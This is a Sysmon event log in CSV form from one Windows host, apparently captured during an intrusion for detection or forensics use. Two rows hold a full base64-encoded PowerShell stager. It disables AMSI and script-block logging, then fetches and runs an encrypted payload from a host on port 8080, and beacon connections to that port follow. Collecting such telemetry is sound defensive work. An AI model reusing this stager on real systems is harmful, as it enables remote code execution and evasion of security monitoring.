,UtcTime,ProcessId,EventID,User,Image,ImageLoaded,CommandLine,ParentImage,ParentCommandLine,DestinationPort,Protocol,QueryName,TargetFilename,TargetObject
2940,2020-05-12 14:54:27.581,9344,1,DESKTOP-TATBGQH\anon,C:\Windows\System32\whoami.exe,,"""C:\Windows\system32\whoami.exe"" /groups",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",,,,,
2942,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\imm32.dll,,,,,,,,
2943,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\netutils.dll,,,,,,,,
2944,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2945,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\wkscli.dll,,,,,,,,
2946,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\authz.dll,,,,,,,,
2947,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\sspicli.dll,,,,,,,,
2948,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\version.dll,,,,,,,,
2949,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
2950,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\combase.dll,,,,,,,,
2951,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\shlwapi.dll,,,,,,,,
2952,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ws2_32.dll,,,,,,,,
2953,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
2954,2020-05-12 14:54:27.527,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
2955,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
2956,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
2957,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\win32u.dll,,,,,,,,
2958,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\user32.dll,,,,,,,,
2959,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
2960,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2961,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
2962,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
2963,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
2964,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
2965,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2966,2020-05-12 14:54:27.512,1580,7,,C:\Windows\System32\whoami.exe,C:\Windows\System32\whoami.exe,,,,,,,,
2967,2020-05-12 14:54:27.510,1580,1,DESKTOP-TATBGQH\anon,C:\Windows\System32\whoami.exe,,"""C:\Windows\system32\whoami.exe"" /groups",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAEUATQBiAEwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAGEATABVAGUAKAAkAG4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8ATABMAGUAQwB0AGkAbwBOAHMALgBHAGUAbgBlAFIASQBDAC4ARABJAEMAVABpAG8AbgBhAHIAWQBbAFMAVAByAGkAbgBnACwAUwB5AFMAVABlAE0ALgBPAGIASgBlAEMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAVgBhAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABzAEUAewBbAFMAYwByAGkAUAB0AEIATABPAGMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBlACgAJABuAFUATABsACwAKABOAGUAVwAtAE8AYgBqAGUAYwBUACAAQwBvAEwAbABFAEMAdABpAE8AbgBzAC4ARwBlAG4AZQBSAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBpAE4ARwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBiAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBMAEwALAAkAFQAUgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMAZQByAFYASQBjAEUAUABvAGkAbgB0AE0AQQBOAGEARwBFAFIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AVABpAG4AdQBFAD0AMAA7ACQAdwBDAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAEUAQgBDAGwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAFgAWQA9AFsAUwBZAHMAVABFAE0ALgBOAEUAdAAuAFcAZQBiAFIAZQBRAHUAZQBzAFQAXQA6ADoARABlAGYAYQBVAGwAVABXAGUAQgBQAHIATwB4AFkAOwAkAHcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBuAFQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgB0AGkAYQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBBAFUAbABUAE4AZQBUAHcAbwByAEsAQwByAGUARABFAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAE0ALgBUAEUAeABUAC4ARQBuAEMAbwBkAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAeQB0AEUAcwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAQQBEAGUAcgBzAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBqAHMAagBkAG0AMABoAE4AagBIAHgAYgBaAEcASABrAGEAeQBpACsAcgBOAFkAYwBKAFYAcwA9ACIAKQA7ACQARABhAHQAQQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQAZABhAFQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABBAHQAQQAuAEwARQBOAGcAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",,,,,
2968,2020-05-12 14:54:27.402,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.We0722664#\acfd5f092b38d2f95523403e78d50c40\Microsoft.WSMan.Management.ni.dll,,,,,,,,
2969,2020-05-12 14:54:27.402,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P1706cafe#\d7300a35c05ae78b713025a7a312b0e5\Microsoft.PowerShell.Commands.Diagnostics.ni.dll,,,,,,,,
2970,2020-05-12 14:54:27.355,9116,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.M870d558a#\cd38c27fd7940a9cfdc58cbce601b927\Microsoft.Management.Infrastructure.Native.ni.dll,,,,,,,,
2971,2020-05-12 14:54:22.265,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2972,2020-05-12 14:54:17.220,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2973,2020-05-12 14:54:12.189,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2975,2020-05-12 14:54:07.172,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2977,2020-05-12 14:54:02.140,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2978,2020-05-12 14:54:01.605,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\TIWORKER.EXE-86CA910A.pf,
2979,2020-05-12 14:54:01.511,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\TRUSTEDINSTALLER.EXE-766EFF52.pf,
2980,2020-05-12 14:54:01.418,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\WMIPRVSE.EXE-E8B8DD29.pf,
2981,2020-05-12 14:53:57.103,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2982,2020-05-12 14:53:57.036,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2983,2020-05-12 14:53:56.622,1932,22,,C:\Windows\Sysmon.exe,,,,,,,194.102.18.104.in-addr.arpa.,,
2985,2020-05-12 14:53:54.043,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\ZSOZ8DFV\0F84FA9BC86F6C000C26F4FDC9846DD1[1].gif,
2986,2020-05-12 14:53:54.043,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\IATA3YRC\px[2].gif,
2987,2020-05-12 14:53:52.112,4,3,NT AUTHORITY\SYSTEM,System,,,,,137,udp,,,
2988,2020-05-12 14:53:52.248,1932,22,,C:\Windows\Sysmon.exe,,,,,,,211.128.16.2.in-addr.arpa.,,
2989,2020-05-12 14:53:53.918,7544,7,,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\UserMgrProxy.dll,,,,,,,,
2990,2020-05-12 14:53:51.980,9116,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2991,2020-05-12 14:53:51.996,9728,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatps.exe,,,,,,,static-spartan-neu-s-msn-com.akamaized.net,,
2992,2020-05-12 14:53:51.994,9728,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatps.exe,,,,,,,assets.msn.com,,
2993,2020-05-12 14:53:51.993,9728,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatps.exe,,,,,,,img.s-msn.com,,
2994,2020-05-12 14:53:51.992,9728,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatps.exe,,,,,,,p.adsymptotic.com,,
2995,2020-05-12 14:53:52.886,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\IATA3YRC\BBWOXXE[2].json,
2996,2020-05-12 14:53:52.886,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\IATA3YRC\BB10V3Uf[1].json,
2997,2020-05-12 14:53:52.886,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\IATA3YRC\BB13UAwQ[2].json,
2998,2020-05-12 14:53:52.886,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\ZSOZ8DFV\BB13UyMF[1].json,
2999,2020-05-12 14:53:52.886,7236,11,,C:\Windows\System32\MicrosoftEdgeCP.exe,,,,,,,,C:\Users\anon\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cache\ZSOZ8DFV\BB13VhAD[1].json,
